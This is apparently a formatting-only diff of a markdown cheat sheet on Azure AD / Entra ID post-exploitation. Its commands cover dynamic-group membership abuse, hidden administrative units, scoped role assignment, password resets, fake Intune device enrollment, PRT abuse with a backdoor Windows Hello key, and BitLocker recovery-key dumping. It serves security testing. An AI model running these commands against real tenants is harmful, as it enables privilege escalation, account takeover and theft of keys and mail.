@@ -6,7 +6,6 @@
 * Devices
 * Service Principals (Application and Managed Identities)
 
-
 ## Users
 
 * List users: `Get-AzureADUser -All $true`
@@ -33,24 +32,23 @@
     New-MgGroupMember -GroupId $groupid -DirectoryObjectid $targetmember
     ```
 
-
 ### Dynamic Group Membership
 
-Get groups that allow Dynamic membership: 
+Get groups that allow Dynamic membership:
 
 * Powershell Azure AD: `Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}`
 * RoadRecon database: `select objectId, displayName, description, membershipRule, membershipRuleProcessingState, isMembershipRuleLocked from groups where membershipRule is not null;`
 
-Rule example : `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`     
+Rule example : `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`
 Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group
 
 1. Open user's profile, click on **Manage**
 2. Click on **Resend** invite and to get an invitation URL
 3. Set the secondary email
+
     ```powershell
     PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>.onmicrosoft.com -Verbose
     ```
-
 
 ### Administrative Unit
 
@@ -74,8 +72,8 @@ az rest \
   --body '{"displayName": "Hidden AU Administrative Unit", "isMemberManagementRestricted":false, "visibility": "HiddenMembership"}'
 ```
 
+* Create a new Administrative Unit using the `New-MgDirectoryAdministrativeUnit` cmdlet.
 
-* Create a new Administrative Unit using the `New-MgDirectoryAdministrativeUnit` cmdlet. 
     ```ps1
     Connect-MgGraph -Scopes "AdministrativeUnit.ReadWrite.All"
     Import-Module Microsoft.Graph.Identity.DirectoryManagement
@@ -90,6 +88,7 @@ az rest \
     ```
 
 * Add a member with `New-MgDirectoryAdministrativeUnitMemberByRef`
+
     ```ps1
     Connect-MgGraph -Scopes "AdministrativeUnit.ReadWrite.All"
     Import-Module Microsoft.Graph.Identity.DirectoryManagement
@@ -102,6 +101,7 @@ az rest \
     ```
 
 * List members even when the administrative unit is hidden.
+
     ```ps1
     Connect-MgGraph -Scopes "AdministrativeUnit.Read.All", "Member.Read.Hidden", "Directory.Read.All"
     Import-Module Microsoft.Graph.Identity.DirectoryManagement
@@ -111,6 +111,7 @@ az rest \
     ```
 
 * Assign the `User Administrator` role, its ID is `947ccf23-ee27-4951-8110-96c62c680311` in this tenant.
+
     ```ps1
     Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"
     Import-Module Microsoft.Graph.Identity.DirectoryManagement
@@ -126,6 +127,7 @@ az rest \
 
     New-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId $administrativeUnitId -BodyParameter $params
     ```
+
 * Now the user with the id `61b0d52f-a902-4769-9a09-c6528336b00a` can edit the property of the other users in the Administrative Units.
 
 Administrative Units can reset password of another user.
@@ -134,7 +136,6 @@ Administrative Units can reset password of another user.
 PS C:\Tools> $password = "Password" | ConvertToSecureString -AsPlainText -Force
 PS C:\Tools> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<Username>@<TENANT NAME>.onmicrosoft.com"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
 ```
-
 
 ### Convert GUID to SID
 
@@ -158,7 +159,6 @@ $user = Get-AzureADUser -SearchString "username"
 Get-AzureADUserRegisteredDevice -ObjectId $user.ObjectId -All $true
 ```
 
-
 ### Device State
 
 ```ps1
@@ -172,17 +172,17 @@ PS> dsregcmd.exe /status
  Device Name : jumpvm
 ```
 
-* **Azure AD Joined** : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large
-* **Workplace Joined** : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large
-* **Hybrid Joined** : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large
-* **Workplace joined on AADJ or Hybrid** : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large
-
+* [**Azure AD Joined**](https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large)
+* [**Workplace Joined**](https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large)
+* [**Hybrid Joined**](https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large)
+* [**Workplace joined on AADJ or Hybrid**](https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large)
 
 ### Join Devices
 
 [Enroll Windows 10/11 devices in Intune](https://learn.microsoft.com/en-us/mem/intune/user-help/enroll-windows-10-device)
 
 * [secureworks/pytune](https://github.com/secureworks/pytune) - Pytune is a post-exploitation tool for enrolling a fake device into Intune with mulitple platform support.
+
     ```ps1
     usage: pytune.py [-h] {entra_join,entra_delete,enroll_intune,checkin,retire_intune,check_compliant,download_apps} ...
 
@@ -193,14 +193,11 @@ PS> dsregcmd.exe /status
     python3 pytune.py check_compliant -o Windows -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p *********** -H $HWHASH
     ```
 
-
-
 ### Register Devices
 
 ```ps1
 roadtx device -a register -n swkdeviceup
 ```
-
 
 ### Windows Hello for Business
 
@@ -211,7 +208,6 @@ roadtx.exe prt -hk swkdevicebackdoor.key -u <user@domain.lab> -c swkdeviceup.pem
 roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
 ```
 
-
 ### Bitlocker Keys
 
 ```ps1
@@ -221,7 +217,6 @@ Connect-MgGraph -Scopes BitLockerKey.Read.All
 Get-MgInformationProtectionBitlockerRecoveryKey -All
 Get-MgInformationProtectionBitlockerRecoveryKey -BitlockerRecoveryKeyId $bitlockerRecoveryKeyId
 ```
-
 
 ## Service Principals
 
@@ -240,7 +235,6 @@ ObjectId                             AppId                                Displa
 0ea80ff0-a9ea-43b6-b876-d5989efd8228 00000009-0000-0000-c000-000000000000 Microsoft Power BI Reporting and Analytics</dev:code>
 ```
 
-
 ## Other
 
 Lists all the client IDs you can use to get a token with the `mail.read` scope on the Microsoft Graph:
@@ -249,7 +243,6 @@ Lists all the client IDs you can use to get a token with the `mail.read` scope o
 roadtx getscope -s https://graph.microsoft.com/mail.read
 roadtx findscope -s https://graph.microsoft.com/mail.read
 ```
-
 
 ## References
 
